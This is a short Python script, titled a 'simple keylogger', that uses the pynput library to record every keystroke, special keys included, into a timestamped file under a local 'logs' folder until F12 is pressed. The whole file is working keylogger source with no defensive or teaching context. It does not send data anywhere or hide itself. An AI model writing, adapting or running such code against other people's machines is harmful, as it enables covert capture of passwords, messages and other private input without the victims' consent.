"""
Simple keylogger
Tracks keystrokes and saves it into a file dated to when the program started
"""

from os.path import exists # Checking if valid log file name
from os import makedirs # Creating directory to store logs
from time import strftime # Creating log file name
from sys import exit as sysexit # Stop program
from pynput import keyboard # Log keystrokes

def on_key_press(key):
    """
    Given a key, writes it to a file
    """
    # Log key
    try:
        # Text Key
        file = open(FILENAME, "a")
        file.write(key.char)
        file.close()
    except AttributeError:
        # Adjustment Key
        file = open(FILENAME, "a")
        file.write(f"[{key}]")
        file.close()
    except TypeError:
        # Custom Key
        file = open(FILENAME, "a")
        file.write(f"[Custom: {key}]")
        file.close()

    # Stop keylogger
    if key == keyboard.Key.f12:
        sysexit()

# Creating file to store keys
if not exists("logs"):
    makedirs("logs")

# Creating FILENAME
FILENAME = ("logs/{}.txt").format(strftime("log-%Y-%m-%d_%H-%M-%S"))

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
